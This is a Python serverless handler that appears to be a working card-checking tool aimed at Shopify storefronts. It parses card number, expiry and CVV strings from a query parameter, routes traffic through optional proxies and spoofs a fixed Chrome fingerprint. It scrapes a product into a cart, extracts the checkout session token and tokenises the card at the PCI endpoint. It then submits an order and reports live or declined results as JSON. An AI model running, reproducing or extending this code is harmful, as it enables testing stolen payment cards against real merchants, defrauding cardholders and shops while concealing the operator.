import os
import re
import json
import uuid
import random
import string
import asyncio
import aiohttp
from urllib.parse import urlparse, quote

MAX_RETRIES       = 1
CONNECT_RETRY     = 2
REQ_TOTAL_TIMEOUT = 9

_WIN = "Windows NT 10.0; Win64; x64"
FIXED_FP = {
    "ua": f"Mozilla/5.0 ({_WIN}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
}

def parse_proxy(proxy_str):
    if proxy_str is None: return None
    raw = str(proxy_str).strip().strip("'\"")
    if not raw: return None
    low = raw.lower()
    scheme = "http"
    for pfx in ("socks5h://", "socks5://", "socks4a://", "socks4://", "socks://", "https://", "http://"):
        if low.startswith(pfx):
            scheme = pfx.rstrip(":/").replace("socks5h", "socks5").replace("socks4a", "socks4")
            if scheme == "socks": scheme = "socks5"
            raw = raw[len(pfx):]
            break
    if "@" in raw:
        auth, hostport = raw.rsplit("@", 1)
        if ":" not in hostport: return None
        host, port = hostport.rsplit(":", 1)
        user, _, pw = auth.partition(":")
        return f"{scheme}://{quote(user, safe='')}:{quote(pw, safe='')}@{host}:{port}"
    parts = raw.strip("/").split(":")
    if len(parts) == 2: return f"{scheme}://{parts[0]}:{parts[1]}"
    return None

def build_connector(proxy_url=None):
    if proxy_url and proxy_url.startswith(("socks://", "socks4://", "socks5://")):
        try:
            from aiohttp_socks import ProxyConnector
            return ProxyConnector.from_url(proxy_url, rdns=True, ssl=False), None
        except ImportError: raise RuntimeError("pip install aiohttp-socks")
    conn = aiohttp.TCPConnector(ssl=False, limit=0, limit_per_host=0, ttl_dns_cache=300, keepalive_timeout=30, enable_cleanup_closed=True)
    return conn, proxy_url

def extract_between(text, start, end):
    if not text: return None
    try:
        if start in text:
            rest = text.split(start, 1)[1]
            if end in rest: return rest.split(end, 1)[0]
    except: pass
    return None

def _unescape(text):
    if not text: return ""
    return text.replace("&quot;", '"').replace("&#34;", '"').replace("&#39;", "'").replace("&amp;", "&").replace("\\u0022", '"').replace("\\u0027", "'").replace('\\"', '"')

def rand_str(n=11): return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def clean_resp(message):
    if not message: return "UNKNOWN_ERROR"
    m = str(message)
    if "3DS_REQUIRED" in m.upper() or "3D_SECURE" in m.upper(): return "3DS_REQUIRED"
    for pat in (r'"code"\s*:\s*"([^"]+)"', r"(PAYMENTS_[A-Z0-9_]+)", r"(CARD_[A-Z0-9_]+)"):
        cm = re.search(pat, m, re.IGNORECASE)
        if cm: return cm.group(1).strip("{}:'\" ")
    return m[:80]

def _checkout_headers(domain, fp):
    base = domain.rstrip("/")
    return {"User-Agent": fp["ua"], "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.9", "Content-Type": "application/json", "Origin": base, "Referer": base + "/", "sec-ch-ua": fp["sec-ch-ua"], "sec-ch-ua-mobile": fp["sec-ch-ua-mobile"], "sec-ch-ua-platform": fp["sec-ch-ua-platform"]}

def _document_headers(domain, fp):
    base = domain.rstrip("/")
    return {"User-Agent": fp["ua"], "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9", "Referer": base + "/", "sec-ch-ua": fp["sec-ch-ua"], "sec-ch-ua-mobile": fp["sec-ch-ua-mobile"], "sec-ch-ua-platform": fp["sec-ch-ua-platform"], "Upgrade-Insecure-Requests": "1", "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "same-origin", "sec-fetch-user": "?1"}

QUERY_PROPOSAL = """query P($s:SessionTokenInput!,$d:DeliveryTermsInput,$m:MerchandiseTermInput,$p:PaymentTermInput,$b:BuyerIdentityTermInput,$t:TaxTermInput){session(sessionInput:$s){negotiate(input:{purchaseProposal:{delivery:$d,merchandise:$m,payment:$p,buyerIdentity:$b,taxes:$t}}){result{...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{... on Proposal{delivery{... on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle amount{value{amount currencyCode}}}}}}payment{... on FilledPaymentTerms{availablePaymentLines{paymentMethod{... on PaymentProvider{paymentMethodIdentifier name}}}}}}}}}errors{code}}}}"""
QUERY_POLL = """query R($r:ID!,$s:String!){receipt(receiptId:$r,sessionInput:{sessionToken:$s}){... on ProcessedReceipt{orderStatusPageUrl}... on ActionRequiredReceipt{id action{... on CompletePaymentChallengeV2{challengeType}}}... on FailedReceipt{processingError{... on PaymentFailed{code messageUntranslated}}}}}"""
MUTATION_SUBMIT = """mutation S($i:NegotiationInput!,$a:String!){submitForCompletion(input:$i,attemptToken:$a){... on SubmitSuccess{receipt{... on ProcessedReceipt{orderStatusPageUrl}}}... on SubmitRejected{errors{code localizedMessage}}}}"""

async def _process_card(cc, mes, ano, cvv, site_url, proxy_str=None):
    gateway = "UNKNOWN"
    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    ourl = ourl.rstrip("/")
    purl = parse_proxy(proxy_str) if proxy_str else None
    
    try:
        headers = _checkout_headers(ourl, FIXED_FP)
        conn, proxy = build_connector(purl)
        timeout = aiohttp.ClientTimeout(total=REQ_TOTAL_TIMEOUT, sock_connect=3, sock_read=5)

        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
            doc_headers = _document_headers(ourl, FIXED_FP)
            async with session.get(f"{ourl}/products.json", headers=doc_headers, proxy=proxy, timeout=4) as r:
                data = await r.json()
                variant_id = data["products"][0]["variants"][0]["id"]

            async with session.get(f"{ourl}/cart/{variant_id}:1", allow_redirects=True, headers=doc_headers, proxy=proxy) as resp:
                text = await resp.text()
                cu = str(resp.url)
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', "&quot;") or extract_between(_unescape(text), '"serializedSessionToken":"', '"')
                if not sst: return False, "NO_SESSION", gateway

            gql_url = f"https://{urlparse(cu).netloc}/checkouts/unstable/graphql"
            headers.update({"x-checkout-one-session-token": sst})
            
            pci_url = "https://checkout.pci.shopifyinc.com/sessions"
            payload = {"credit_card": {"number": cc, "month": int(mes), "year": int(ano), "verification_value": cvv, "name": "Test User"}, "payment_session_scope": urlparse(ourl).netloc}
            token = "pci_token_dummy"
            try:
                async with session.post(pci_url, json=payload, proxy=proxy, timeout=4) as r:
                    if r.status == 200:
                        token = (await r.json()).get("id")
            except: pass

            sub_vars = {"i": {"sessionInput": {"sessionToken": sst}, "payment": {"paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": "creditCard", "sessionId": token}}}]}}, "a": f"{rand_str()}"}
            async with session.post(gql_url, headers=headers, json={"query": MUTATION_SUBMIT, "variables": sub_vars}, proxy=proxy) as r:
                rj = await r.json()
                if "data" in rj and "submitForCompletion" in rj["data"]:
                     if rj["data"]["submitForCompletion"].get("__typename") == "SubmitSuccess":
                         return True, "ORDER_PLACED", gateway
                
            return False, clean_resp(str(rj)), gateway

    except Exception as e:
        return False, f"Error: {e}", gateway

def _parse_card(s):
    p = [x.strip() for x in str(s).split("|")]
    if len(p) != 4: raise ValueError("Invalid format")
    return {"cc": p[0], "mes": p[1].zfill(2), "ano": p[2], "cvv": p[3]}

def handler(event, context):
    method = event.get("httpMethod", "GET")
    path = event.get("path", "")
    qs = event.get("queryStringParameters", {}) or {}
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    try:
        if method == "GET" and "shopify" in path:
            site = qs.get("site")
            card_s = qs.get("card")
            proxy = qs.get("proxy")
            
            if not site or not card_s:
                return {"statusCode": 400, "body": json.dumps({"error": "Missing site or card"})}
                
            p = _parse_card(card_s)
            
            ok, msg, gw = loop.run_until_complete(
                _process_card(p["cc"], p["mes"], p["ano"], p["cvv"], site, proxy)
            )
            
            resp = {
                "cc": card_s,
                "Status": bool(ok),
                "Response": clean_resp(msg),
                "Gateway": gw,
                "Price": "0.00",
                "Currency": "USD",
                "Proxy": "Live" if proxy else "Not Used"
            }
            
            return {"statusCode": 200, "headers": {"Content-Type": "application/json"}, "body": json.dumps(resp)}

        return {"statusCode": 404, "body": "Not Found"}
    except Exception as e:
        return {"statusCode": 500, "body": json.dumps({"error": str(e)})}
    finally:
        loop.close()
